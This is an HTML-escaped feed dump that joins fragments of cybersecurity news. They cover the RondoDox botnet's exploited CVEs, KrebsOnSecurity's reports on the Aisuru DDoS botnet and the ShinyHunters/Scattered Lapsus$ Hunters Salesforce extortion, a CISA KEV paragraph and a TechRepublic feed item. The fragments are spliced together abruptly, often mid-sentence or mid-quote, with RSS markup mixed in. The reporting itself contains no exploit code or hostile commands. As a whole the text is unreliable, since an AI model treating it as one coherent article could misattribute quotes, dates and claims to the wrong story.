&lt;ul&gt;
&lt;li&gt;A new large-scale botnet campaign, RondoDox, is actively &lt;a href="https://www.trendmicro.com/en_us/research/25/j/rondodox.html"&gt;exploiting&lt;/a&gt; 56 vulnerabilities &amp;#8211; including RCE and command injection CVEs like CVE-2023-1389, CVE-2024-3721, and CVE-2024-12856 &amp;#8211; across 30+ device types (DVRs, NVRs, CCTV, web servers). Active since June, it exploits new and legacy bugs (including unpatched EOL devices), weaponizes Pwn2Own code, and uses an &amp;#8220;exploit shotgun&amp;#8221; to maximize infections and seize device/network control.&lt;/li&gt;
&lt;/ul&gt;
&lt;p style="padding-left: 40px;"&gt;&lt;em&gt;Check &lt;/em&gt;&lt;em&gt;Point IPS provides protection against this threat &lt;/em&gt;&lt;em&gt;(TP-Link Archer AX21 Command Injection (CVE-2023-1389); TBK DVR Devices Command Injection (CVE-2024-3721); Four-Faith F3x Series Command Injection (CVE-2024-12856))&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;

Experts say the heavy concentration of infected devices at U.S. providers is complicating efforts to limit collateral damage from the botnet&amp;#8217;s attacks, which shattered previous records this week with a brief traffic flood that clocked in at nearly 30 trillion bits of data per second.&lt;/p&gt;
&lt;p&gt;Since its debut more than a year ago, the Aisuru botnet has steadily outcompeted virtually all other IoT-based botnets in the wild, with recent attacks siphoning Internet bandwidth from an estimated 300,000 compromised hosts worldwide.&lt;/p&gt;
&lt;p&gt;The hacked systems that get subsumed into the botnet are mostly consumer-grade routers, security cameras, digital video recorders and other devices operating with insecure and outdated firmware, and/or factory-default settings. Aisuru&amp;#8217;s owners are continuously scanning the Internet for these vulnerable devices and enslaving them for use in distributed denial-of-service (DDoS) attacks that can overwhelm targeted servers with crippling amounts of junk traffic.&lt;/p&gt;
&lt;p&gt;As Aisuru&amp;#8217;s size has mushroomed, so has its punch. In May 2025, KrebsOnSecurity was &lt;a href="https://krebsonsecurity.com/2025/05/krebsonsecurity-hit-with-near-record-6-3-tbps-ddos/" rel="noopener" target="_blank"&gt;hit with a near-record 6.35 terabits per second (Tbps) attack from Aisuru,&lt;/a&gt; which was then the largest assault that Google&amp;#8217;s DDoS protection service &lt;strong&gt;Project Shield&lt;/strong&gt; had ever mitigated. Days later, Aisuru shattered that record with a data blast in excess of 11 Tbps.&lt;/p&gt;
&lt;p&gt;By late September, Aisuru was publicly flexing DDoS capabilities topping 22 Tbps. Then on October 6, its operators heaved a whopping 29.6 terabits of junk data packets each second at a targeted host. Hardly anyone noticed because it appears to have been a brief test or demonstration of Aisuru&amp;#8217;s capabilities: The traffic flood lasted less only a few seconds and was pointed at an Internet server that was specifically designed to measure large-scale DDoS attacks.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_72353" style="width: 753px;"&gt;&lt;img alt="" class=" wp-image-72353" height="93" src="https://krebsonsecurity.com/wp-content/uploads/2025/10/29-69t.png" width="743" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-72353"&gt;A measurement of an Oct. 6 DDoS believed to have been launched through multiple botnets operated by the owners of the Aisuru botnet. Image: DDoS Analyzer Community on Telegram.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;Aisuru&amp;#8217;s overlords aren&amp;#8217;t just showing off. Their botnet is being blamed for a series of increasingly massive and disruptive attacks. Although recent assaults from Aisuru have targeted mostly ISPs that serve online gaming communities like &lt;strong&gt;Minecraft&lt;/strong&gt;, those digital sieges often result in widespread collateral Internet disruption.&lt;/p&gt;
&lt;p&gt;For the past several weeks, ISPs hosting some of the Internet&amp;#8217;s top gaming destinations have been hit with a relentless volley of gargantuan attacks that experts say are well beyond the DDoS mitigation capabilities of most organizations connected to the Internet today.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Steven Ferguson&lt;/strong&gt; is principal security engineer at &lt;strong&gt;Global Secure Layer&lt;/strong&gt; (GSL), an ISP in Brisbane, Australia. GSL hosts &lt;strong&gt;TCPShield&lt;/strong&gt;, which offers free or low-cost DDoS protection to more than 50,000 Minecraft servers worldwide. Ferguson told KrebsOnSecurity that on October 8, TCPShield was walloped with a blitz from Aisuru that flooded its network with more than 15 terabits of junk data per second.&lt;/p&gt;
&lt;p&gt;Ferguson said that after the attack subsided, TCPShield was told by its upstream provider &lt;strong&gt;OVH&lt;/strong&gt; that they were no longer welcome as a customer.&lt;/p&gt;
&lt;p&gt;&amp;#8220;This was causing serious congestion on their Miami external ports for several weeks, shown publicly via their weather map,&amp;#8221; he said, explaining that TCPShield is now solely protected by GSL.&lt;/p&gt;
&lt;p&gt;Traces from the recent spate of crippling Aisuru &lt;a href="https://www.youtube.com/watch?v=OAzk1K4sn7k" rel="noopener" target="_blank"&gt;attacks on gaming servers&lt;/a&gt; can be still seen at the website &lt;a href="https://grafana.blockgametracker.gg/d/nlKArnQ4k/global-playercount-by-as?orgId=1&amp;amp;viewPanel=3&amp;amp;from=1759040061640&amp;amp;to=1759161701743" rel="noopener" target="_blank"&gt;blockgametracker.gg&lt;/a&gt;, which indexes the uptime and downtime of the top Minecraft hosts. In the following example from a series of data deluges on the evening of September 28, we can see an Aisuru botnet campaign briefly knocked TCPShield offline.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_72328" style="width: 760px;"&gt;&lt;img alt="" class=" wp-image-72328" height="457" src="https://krebsonsecurity.com/wp-content/uploads/2025/10/tcpshield-aisuru.png" width="750" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-72328"&gt;An Aisuru botnet attack on TCPShield (AS64199) on Sept. 28  can be seen in the giant downward spike in the middle of this uptime graphic. Image: grafana.blockgametracker.gg.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;Paging through the same uptime graphs for other network operators listed shows almost all of them suffered brief but repeated outages around the same time. Here is the same uptime tracking for Minecraft servers on the network provider &lt;strong&gt;Cosmic&lt;/strong&gt; (AS30456), and it shows multiple large dips that correspond to game server outages caused by Aisuru.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_72333" style="width: 757px;"&gt;&lt;a href="https://krebsonsecurity.com/wp-content/uploads/2025/10/cosmic-aisuru.png" rel="noopener" target="_blank"&gt;&lt;img alt="" class="wp-image-72333" height="463" src="https://krebsonsecurity.com/wp-content/uploads/2025/10/cosmic-aisuru.png" width="747" /&gt;&lt;/a&gt;&lt;p class="wp-caption-text" id="caption-attachment-72333"&gt;Multiple DDoS attacks from Aisuru can be seen against the Minecraft host Cosmic on Sept. 28. The sharp downward spikes correspond to brief but enormous attacks from Aisuru. Image: grafana.blockgametracker.gg.&lt;/p&gt;&lt;/div&gt;
&lt;h2&gt;BOTNETS R US&lt;/h2&gt;
&lt;p&gt;Ferguson said he&amp;#8217;s been tracking Aisuru for about three months, and recently he noticed the botnet&amp;#8217;s composition shifted heavily toward infected systems at ISPs in the United States. Ferguson shared logs from an attack on October 8 that indexed traffic by the total volume sent through each network provider, and the logs showed that 11 of the top 20 traffic sources were U.S. based ISPs.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;AT&amp;amp;T&lt;/strong&gt; customers were by far the biggest U.S. contributors to that attack, followed by botted systems on &lt;strong&gt;Charter Communications&lt;/strong&gt;, &lt;strong&gt;Comcast&lt;/strong&gt;, &lt;strong&gt;T-Mobile&lt;/strong&gt; and &lt;strong&gt;Verizon&lt;/strong&gt;, Ferguson found. He said the volume of data packets per second coming from infected IoT hosts on these ISPs is often so high that it has started to affect the quality of service that ISPs are able to provide to adjacent (non-botted) customers.&lt;/p&gt;
&lt;p&gt;&amp;#8220;The impact extends beyond victim networks,&amp;#8221; Ferguson said. &amp;#8220;For instance we have seen 500 gigabits of traffic via Comcast&amp;#8217;s network alone. This amount of egress leaving their network, especially being so US-East concentrated, will result in congestion towards other services or content trying to be reached while an attack is ongoing.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Roland Dobbins&lt;/strong&gt; is principal engineer at &lt;strong&gt;Netscout&lt;/strong&gt;. Dobbins said Ferguson is spot on, noting that while most ISPs have effective mitigations in place to handle large incoming DDoS attacks, many are far less prepared to manage the inevitable service degradation caused by large numbers of their customers suddenly using some or all available bandwidth to attack others.&lt;/p&gt;
&lt;p&gt;&lt;span class="pullquote pqright"&gt;&amp;#8220;The outbound and cross-bound DDoS attacks can be just as disruptive as the inbound stuff,&amp;#8221; Dobbin said.&lt;/span&gt; &amp;#8220;We&amp;#8217;re now in a situation where ISPs are routinely seeing terabit-per-second plus outbound attacks from their networks that can cause operational problems.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&amp;#8220;The crying need for effective and universal outbound DDoS attack suppression is something that is really being highlighted by these recent attacks,&amp;#8221; Dobbins continued. &amp;#8220;A lot of network operators are learning that lesson now, and there&amp;#8217;s going to be a period ahead where there&amp;#8217;s some scrambling and potential disruption going on.&amp;#8221;&lt;/p&gt;
&lt;p&gt;KrebsOnSecurity sought comment from the ISPs named in Ferguson&amp;#8217;s report. Charter Communications pointed to &lt;a href="https://policy.charter.com/protecting-our-networks" rel="noopener" target="_blank"&gt;a recent blog post on protecting its network&lt;/a&gt;, stating that Charter actively monitors for both inbound and outbound attacks, and that it takes proactive action wherever possible.&lt;/p&gt;
&lt;p&gt;&amp;#8220;In addition to our own extensive network security, we also aim to reduce the risk of customer connected devices contributing to attacks through our Advanced WiFi solution that includes Security Shield, and we make Security Suite available to our Internet customers,&amp;#8221; Charter wrote in an emailed response to questions. &amp;#8220;With the ever-growing number of devices connecting to networks, we encourage customers to purchase trusted devices with secure development and manufacturing practices, use anti-virus and security tools on their connected devices, and regularly download security patches.&amp;#8221;&lt;/p&gt;
&lt;p&gt;A spokesperson for Comcast responded, &amp;#8220;Currently our network is not experiencing impacts and we are able to handle the traffic.&amp;#8221;&lt;span id="more-72321"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;9 YEARS OF MIRAI&lt;/h2&gt;
&lt;p&gt;Aisuru is built on the bones of malicious code that was &lt;a href="https://krebsonsecurity.com/2016/10/source-code-for-iot-botnet-mirai-released/" rel="noopener" target="_blank"&gt;leaked in 2016&lt;/a&gt; by &lt;a href="https://krebsonsecurity.com/2017/01/who-is-anna-senpai-the-mirai-worm-author/" rel="noopener" target="_blank"&gt;the original creators of the &lt;strong&gt;Mirai&lt;/strong&gt; IoT botnet&lt;/a&gt;. Like Aisuru, Mirai quickly outcompeted all other DDoS botnets in its heyday, and obliterated previous DDoS attack records with a 620 gigabit-per-second siege that &lt;a href="https://krebsonsecurity.com/2016/09/the-democratization-of-censorship/" rel="noopener" target="_blank"&gt;sidelined this website for nearly four days in 2016&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The Mirai botmasters likewise used their crime machine to attack mostly Minecraft servers, but with the goal of forcing Minecraft server owners to purchase a DDoS protection service that they controlled. In addition, they rented out slices of the Mirai botnet to paying customers, some of whom used it to mask the sources of other types of cybercrime, such as click fraud.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_36755" style="width: 743px;"&gt;&lt;img alt="" class=" wp-image-36755" height="417" src="https://krebsonsecurity.com/wp-content/uploads/2016/10/l3outage-580x330.png" width="733" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-36755"&gt;A depiction of the outages caused by the Mirai botnet attacks against the internet infrastructure firm Dyn on October 21, 2016. Source: Downdetector.com.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;Dobbins said Aisuru&amp;#8217;s owners also appear to be renting out their botnet as a distributed proxy network that cybercriminal customers anywhere in the world can use to anonymize their malicious traffic and make it appear to be coming from regular residential users in the U.S.&lt;/p&gt;
&lt;p&gt;&amp;#8220;The people who operate this botnet are also selling (it as) residential proxies,&amp;#8221; he said. &amp;#8220;And that&amp;#8217;s being used to reflect application layer attacks through the proxies on the bots as well.&amp;#8221;&lt;/p&gt;
&lt;p&gt;The Aisuru botnet harkens back to its predecessor Mirai in another intriguing way. One of its owners is using the Telegram handle &amp;#8220;&lt;strong&gt;9gigsofram&lt;/strong&gt;,&amp;#8221; which corresponds to the nickname used by the co-owner of a Minecraft server protection service called &lt;strong&gt;Proxypipe&lt;/strong&gt; that was &lt;a href="https://krebsonsecurity.com/2017/01/who-is-anna-senpai-the-mirai-worm-author/" rel="noopener" target="_blank"&gt;heavily targeted in 2016 by the original Mirai botmasters&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Robert Coelho&lt;/strong&gt; co-ran Proxypipe back then along with his business partner &lt;strong&gt;Erik &amp;#8220;9gigsofram&amp;#8221; Buckingham&lt;/strong&gt;, and has spent the past nine years fine-tuning various DDoS mitigation companies that cater to Minecraft server operators and other gaming enthusiasts. Coelho said he has no idea why one of Aisuru&amp;#8217;s botmasters chose Buckingham&amp;#8217;s nickname, but added that it might say something about how long this person has been involved in the DDoS-for-hire industry.&lt;/p&gt;
&lt;p&gt;&amp;#8220;The Aisuru attacks on the gaming networks these past seven day have been absolutely huge, and you can see tons of providers going down multiple times a day,&amp;#8221; Coelho said.&lt;/p&gt;
&lt;p&gt;Coelho said the 15 Tbps attack this week against TCPShield was likely only a portion of the total attack volume hurled by Aisuru at the time, because much of it would have been shoved through networks that simply couldn&amp;#8217;t process that volume of traffic all at once. Such outsized attacks, he said, are becoming increasingly difficult and expensive to mitigate.&lt;/p&gt;
&lt;p&gt;&amp;#8220;It&amp;#8217;s definitely at the point now where you need to be spending at least a million dollars a month just to have the network capacity to be able to deal with these attacks,&amp;#8221; he said.&lt;/p&gt;
&lt;h2&gt;RAPID SPREAD&lt;/h2&gt;
&lt;p&gt;Aisuru has long been rumored to use multiple zero-day vulnerabilities in IoT devices to aid its rapid growth over the past year. &lt;strong&gt;XLab&lt;/strong&gt;, the Chinese security company that was the &lt;a href="https://blog.xlab.qianxin.com/large-scale-botnet-airashi-en/" rel="noopener" target="_blank"&gt;first to profile Aisuru&amp;#8217;s rise in 2024&lt;/a&gt;, warned last month that one of the Aisuru botmasters had compromised the firmware distribution website for &lt;strong&gt;Totolink&lt;/strong&gt;, a maker of low-cost routers and other networking gear.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Multiple sources indicate the group allegedly compromised a router firmware update server in April and distributed malicious scripts to expand the botnet,&amp;#8221; XLab &lt;a href="https://blog.xlab.qianxin.com/super-large-scale-botnet-aisuru-en/" rel="noopener" target="_blank"&gt;wrote&lt;/a&gt; on September 15. &amp;#8220;The node count is currently reported to be around 300,000.&amp;#8221;&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_72354" style="width: 716px;"&gt;&lt;img alt="" class="size-full wp-image-72354" height="190" src="https://krebsonsecurity.com/wp-content/uploads/2025/10/xlab-totoscript.png" width="706" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-72354"&gt;A malicious script implanted into a Totolink update server in April 2025. Image: XLab.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;Aisuru&amp;#8217;s operators received an unexpected boost to their crime machine in August when the &lt;strong&gt;U.S. Department Justice&lt;/strong&gt; &lt;a href="https://krebsonsecurity.com/2025/08/oregon-man-charged-in-rapper-bot-ddos-service/" rel="noopener" target="_blank"&gt;charged the alleged proprietor of &lt;strong&gt;Rapper Bot&lt;/strong&gt;&lt;/a&gt;, a DDoS-for-hire botnet that competed directly with Aisuru for control over the global pool of vulnerable IoT systems.&lt;/p&gt;
&lt;p&gt;Once Rapper Bot was dismantled, Aisuru&amp;#8217;s curators moved quickly to commandeer vulnerable IoT devices that were suddenly set adrift by the government&amp;#8217;s takedown, Dobbins said.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Folks were arrested and Rapper Bot control servers were seized and that&amp;#8217;s great, but unfortunately the botnet&amp;#8217;s attack assets were then pieced out by the remaining botnets,&amp;#8221; he said. &amp;#8220;The problem is, even if those infected IoT devices are rebooted and cleaned up, they will still get re-compromised by something else generally within minutes of being plugged back in.&amp;#8221;&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_72344" style="width: 748px;"&gt;&lt;img alt="" class=" wp-image-72344" height="810" src="https://krebsonsecurity.com/wp-content/uploads/2025/10/xlabs-aisuru.png" width="738" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-72344"&gt;A screenshot shared by XLabs showing the Aisuru botmasters recently celebrating a record-breaking 7.7 Tbps DDoS. The user at the top has adopted the name &amp;#8220;Ethan J. Foltz&amp;#8221; in a mocking tribute to the alleged Rapper Bot operator who was arrested and charged in August 2025.&lt;/p&gt;&lt;/div&gt;
&lt;h2&gt;BOTMASTERS AT LARGE&lt;/h2&gt;
&lt;p&gt;XLab&amp;#8217;s &lt;a href="https://blog.xlab.qianxin.com/super-large-scale-botnet-aisuru-en/" rel="noopener" target="_blank"&gt;September blog post&lt;/a&gt; cited multiple unnamed sources saying Aisuru is operated by three cybercriminals: &amp;#8220;Snow,&amp;#8221; who&amp;#8217;s responsible for botnet development; &amp;#8220;Tom,&amp;#8221; tasked with finding new vulnerabilities; and &amp;#8220;&lt;strong&gt;Forky&lt;/strong&gt;,&amp;#8221; responsible for botnet sales.&lt;/p&gt;
&lt;p&gt;KrebsOnSecurity interviewed Forky in our &lt;a href="https://krebsonsecurity.com/2025/05/krebsonsecurity-hit-with-near-record-6-3-tbps-ddos/" rel="noopener" target="_blank"&gt;May 2025 story&lt;/a&gt; about the record 6.3 Tbps attack from Aisuru. That story identified Forky as a 21-year-old man from Sao Paulo, Brazil who has been extremely active in the DDoS-for-hire scene since at least 2022. The FBI has seized Forky&amp;#8217;s DDoS-for-hire domains several times over the years.&lt;/p&gt;
&lt;p&gt;&lt;img alt="" class="aligncenter wp-image-71314" height="500" src="https://krebsonsecurity.com/wp-content/uploads/2025/05/forky.png" width="750" /&gt;&lt;/p&gt;
&lt;p&gt;Like the original Mirai botmasters, Forky also operates a DDoS mitigation service called &lt;strong&gt;Botshield&lt;/strong&gt;. Forky declined to discuss the makeup of his ISP’s clientele, or to clarify whether Botshield was more of a hosting provider or a DDoS mitigation firm. However, Forky has posted on Telegram about Botshield successfully mitigating large DDoS attacks launched against other DDoS-for-hire services.&lt;/p&gt;
&lt;p&gt;In our previous interview, Forky acknowledged being involved in the development and marketing of Aisuru, but denied participating in attacks launched by the botnet.&lt;/p&gt;
&lt;p&gt;Reached for comment earlier this month, Forky continued to maintain his innocence, claiming that he also is still trying to figure out who the current Aisuru botnet operators are in real life (Forky said the same thing in our May interview).&lt;/p&gt;
&lt;p&gt;But after a week of promising juicy details, Forky came up empty-handed once again. Suspecting that Forky was merely being coy, I asked him how someone so connected to the DDoS-for-hire world could still be mystified on this point, and suggested that his inability or unwillingness to blame anyone else for Aisuru would not exactly help his case.&lt;/p&gt;
&lt;p&gt;At this, Forky verbally bristled at being pressed for more details, and abruptly terminated our interview.&lt;/p&gt;
&lt;p&gt;&amp;#8220;I&amp;#8217;m not here to be threatened with ignorance because you are stressed,&amp;#8221; Forky replied. &amp;#8220;They&amp;#8217;re blaming me for those new attacks.

&lt;/ul&gt;
&lt;p&gt;This type of vulnerability is a frequent attack vector for malicious cyber actors and poses significant risks to the federal enterprise.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.cisa.gov/binding-operational-directive-22-01" title="Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities"&gt;Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities&lt;/a&gt;&amp;nbsp;established the KEV Catalog as a living list of known Common Vulnerabilities and Exposures (CVEs) that carry significant risk to the federal enterprise. BOD 22-01 requires Federal Civilian Executive Branch (FCEB) agencies to remediate identified vulnerabilities by the due date to protect FCEB networks against active threats. See the&amp;nbsp;&lt;a href="https://www.cisa.gov/sites/default/files/publications/Reducing_the_Significant_Risk_of_Known_Exploited_Vulnerabilities_211103.pdf" title="BOD 22-01 Fact Sheet"&gt;BOD 22-01 Fact Sheet&lt;/a&gt;&amp;nbsp;for more information.&lt;/p&gt;
&lt;p&gt;Although BOD 22-01 only applies to FCEB agencies, CISA strongly urges all organizations to reduce their exposure to cyberattacks by prioritizing timely remediation of&amp;nbsp;&lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" title="Known Exploited Vulnerabilities Catalog"&gt;KEV Catalog vulnerabilities&lt;/a&gt;&amp;nbsp;as part of their vulnerability management practice. CISA will continue to add vulnerabilities to the catalog that meet the&amp;nbsp;&lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities" title="Reducing the Significant Risk of Known Exploited Vulnerabilities"&gt;specified criteria&lt;/a&gt;.&lt;/p&gt;</description><guid isPermaLink="false">/node/24071</guid></item><item><title>Point of Sale Security Guide and Checklist</title><link>https://www.techrepublic.com/resource-library/checklist/point-of-sale-security/</link><description>&lt;p&gt;This guide and checklist will help you successfully secure a POS system for your business.

The group also claimed responsibility for a recent breach involving &lt;strong&gt;Discord&lt;/strong&gt; user data, and for stealing terabytes of sensitive files from thousands of customers of the enterprise software maker &lt;strong&gt;Red Hat&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_72275" style="width: 1285px;"&gt;&lt;img alt="" class="size-full wp-image-72275" height="879" src="https://krebsonsecurity.com/wp-content/uploads/2025/10/sf-extortionsite.png" width="1275" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-72275"&gt;The new extortion website tied to ShinyHunters (UNC6040), which threatens to publish stolen data unless Salesforce or individual victim companies agree to pay a ransom.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;In May 2025, a prolific and amorphous English-speaking cybercrime group known as &lt;strong&gt;ShinyHunters&lt;/strong&gt; launched a social engineering campaign that used voice phishing to trick targets into connecting a malicious app to their organization&amp;#8217;s Salesforce portal.&lt;/p&gt;
&lt;p&gt;The first real details about the incident came in early June, when the &lt;strong&gt;Google Threat Intelligence Group &lt;/strong&gt;(GTIG) &lt;a href="https://cloud.google.com/blog/topics/threat-intelligence/voice-phishing-data-extortion" rel="noopener" target="_blank"&gt;warned&lt;/a&gt; that ShinyHunters &amp;#8212; tracked by Google as &lt;strong&gt;UNC6040 &lt;/strong&gt;&amp;#8212; was extorting victims over their stolen Salesforce data, and that the group was poised to launch a data leak site to publicly shame victim companies into paying a ransom to keep their records private. A month later, Google acknowledged that one of its own corporate Salesforce instances was impacted in the voice phishing campaign.&lt;/p&gt;
&lt;p&gt;Last week, a new victim shaming blog dubbed &amp;#8220;&lt;strong&gt;Scattered LAPSUS$ Hunters&lt;/strong&gt;&amp;#8221; began publishing the names of companies that had customer Salesforce data stolen as a result of the May voice phishing campaign.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Contact us to negotiate this ransom or all your customers data will be leaked,&amp;#8221; the website stated in a message to Salesforce. &amp;#8220;If we come to a resolution all individual extortions against your customers will be withdrawn from. Nobody else will have to pay us, if you pay, Salesforce, Inc.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Below that message were more than three dozen entries for companies that allegedly had Salesforce data stolen, including &lt;strong&gt;Toyota&lt;/strong&gt;, &lt;strong&gt;FedEx&lt;/strong&gt;, &lt;strong&gt;Disney/Hulu&lt;/strong&gt;, and &lt;strong&gt;UPS&lt;/strong&gt;. The entries for each company specified the volume of stolen data available, as well as the date that the information was retrieved (the stated breach dates range between May and September 2025).&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_72312" style="width: 759px;"&gt;&lt;img alt="" class=" wp-image-72312" height="480" src="https://krebsonsecurity.com/wp-content/uploads/2025/10/mandiant-sf.png" width="749" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-72312"&gt;Image: Mandiant.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;On October 5, the Scattered LAPSUS$ Hunters victim shaming and extortion blog announced that the group was responsible for a breach in September involving a GitLab server used by Red Hat that contained more than 28,000 Git code repositories, including more than 5,000 Customer Engagement Reports (CERs).&lt;/p&gt;
&lt;p&gt;&amp;#8220;Alot of folders have their client&amp;#8217;s secrets such as artifactory access tokens, git tokens, azure, docker (redhat docker, azure containers, dockerhub), their client&amp;#8217;s infrastructure details in the CERs like the audits that were done for them, and a whole LOT more, etc.,&amp;#8221; the hackers claimed.&lt;/p&gt;
&lt;p&gt;Their claims came several days after a previously unknown hacker group calling itself the &lt;strong&gt;Crimson Collective&lt;/strong&gt; took credit for the Red Hat intrusion on Telegram.&lt;/p&gt;
&lt;p&gt;Red Hat &lt;a href="https://www.redhat.com/en/blog/security-update-incident-related-red-hat-consulting-gitlab-instance" rel="noopener" target="_blank"&gt;disclosed on October 2&lt;/a&gt; that attackers had compromised a company GitLab server, and said it was in the process of notifying affected customers.&lt;/p&gt;
&lt;p&gt;&amp;#8220;The compromised GitLab instance housed consulting engagement data, which may include, for example, Red Hat’s project specifications, example code snippets, internal communications about consulting services, and limited forms of business contact information,&amp;#8221; Red Hat wrote.&lt;/p&gt;
&lt;p&gt;Separately, Discord has started emailing users affected by another breach claimed by ShinyHunters. Discord &lt;a href="https://discord.com/press-releases/update-on-security-incident-involving-third-party-customer-service" rel="noopener" target="_blank"&gt;said&lt;/a&gt; an incident on September 20 at a &amp;#8220;third-party customer service provider&amp;#8221; impacted a &amp;#8220;limited number of users&amp;#8221; who communicated with Discord customer support or Trust &amp;amp; Safety teams. The information included Discord usernames, emails, IP address, the last four digits of any stored payment cards, and government ID images submitted during age verification appeals.&lt;/p&gt;
&lt;p&gt;The Scattered Lapsus$ Hunters claim they will publish data stolen from Salesforce and its customers if ransom demands aren&amp;#8217;t paid by October 10. The group also claims it will soon begin extorting hundreds more organizations that lost data in August after a cybercrime group stole &lt;a href="https://krebsonsecurity.com/2025/09/the-ongoing-fallout-from-a-breach-at-ai-chatbot-maker-salesloft/" rel="noopener" target="_blank"&gt;vast amounts of authentication tokens from &lt;strong&gt;Salesloft&lt;/strong&gt;&lt;/a&gt;, whose AI chatbot is used by many corporate websites to convert customer interaction into Salesforce leads.&lt;/p&gt;
&lt;p&gt;In a communication sent to customers today, Salesforce emphasized that the theft of any third-party Salesloft data allegedly stolen by ShinyHunters did not originate from a vulnerability within the core Salesforce platform. The company also stressed that it has no plans to meet any extortion demands.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Salesforce will not engage, negotiate with, or pay any extortion demand,&amp;#8221; the message to customers read. &amp;#8220;Our focus is, and remains, on defending our environment, conducting thorough forensic analysis, supporting our customers, and working with law enforcement and regulatory authorities.&amp;#8221;&lt;/p&gt;
&lt;p&gt;The GTIG tracked the group behind the Salesloft data thefts as &lt;strong&gt;UNC6395&lt;/strong&gt;, and says the group has been observed harvesting the data for authentication tokens tied to a range of cloud services like Snowflake and Amazon&amp;#8217;s AWS.&lt;/p&gt;
&lt;p&gt;Google catalogs Scattered Lapsus$ Hunters by so many UNC names (throw in &lt;strong&gt;UNC6240&lt;/strong&gt; for good measure) because it is thought to be an amalgamation of three hacking groups &amp;#8212; &lt;strong&gt;Scattered Spider&lt;/strong&gt;, Lapsus$ and ShinyHunters. The members of these groups hail from many of the same chat channels on the &lt;strong&gt;Com&lt;/strong&gt;, a mostly English-language cybercriminal community that operates across an ocean of Telegram and Discord servers.&lt;/p&gt;
&lt;p&gt;The Scattered Lapsus$ Hunters darknet blog is currently offline. The outage appears to have coincided with the disappearance of the group&amp;#8217;s new clearnet blog &amp;#8212; &lt;strong&gt;breachforums[.]hn&lt;/strong&gt; &amp;#8212; which vanished after shifting its Domain Name Service (DNS) servers from DDoS-Guard to Cloudflare.&lt;/p&gt;
&lt;p&gt;But before it died, the websites disclosed that hackers were exploiting a critical zero-day vulnerability in &lt;strong&gt;Oracle&amp;#8217;s E-Business Suite&lt;/strong&gt; software. Oracle has since &lt;a href="https://www.oracle.com/security-alerts/alert-cve-2025-61882.html" rel="noopener" target="_blank"&gt;confirmed&lt;/a&gt; that a security flaw tracked as &lt;strong&gt;CVE-2025-61882&lt;/strong&gt; allows attackers to perform unauthenticated remote code execution, and is urging customers to apply an emergency update to address the weakness.&lt;/p&gt;
&lt;p&gt;Mandiant&amp;#8217;s &lt;strong&gt;Charles Carmakal&lt;/strong&gt; &lt;a href="https://www.linkedin.com/posts/charlescarmakal_oracle-security-alert-advisory-cve-2025-activity-7380595612443893760-JNd_/" rel="noopener" target="_blank"&gt;shared on LinkedIn&lt;/a&gt; that CVE-2025-61882 was initially exploited in August 2025 by the Clop ransomware gang to steal data from Oracle E-Business Suite servers. &lt;strong&gt;Bleeping Computer&lt;/strong&gt; &lt;a href="https://www.bleepingcomputer.com/news/security/oracle-patches-ebs-zero-day-exploited-in-clop-data-theft-attacks/" rel="noopener" target="_blank"&gt;writes&lt;/a&gt; that news of the Oracle zero-day first surfaced on the Scattered Lapsus$ Hunters blog, which published a pair of scripts that were used to exploit vulnerable Oracle E-Business Suite instances.&lt;span id="more-72279"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;On Monday evening, KrebsOnSecurity received a malware-laced message from a reader that threatened physical violence unless their unstated demands were met. The missive, titled &amp;#8220;Shiny hunters,&amp;#8221; contained the hashtag $LAPSU$$SCATEREDHUNTER, and urged me to visit a page on limewire[.]com to view their demands.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_72306" style="width: 760px;"&gt;&lt;img alt="" class=" wp-image-72306" height="251" src="https://krebsonsecurity.com/wp-content/uploads/2025/10/sh-malwareemail.png" width="750" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-72306"&gt;A screenshot of the phishing message linking to a malicious trojan disguised as a Windows screensaver file.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;KrebsOnSecurity did not visit this link, but instead forwarded it to Mandiant, which confirmed that similar menacing missives were sent to employees at Mandiant and other security firms around the same time.&lt;/p&gt;
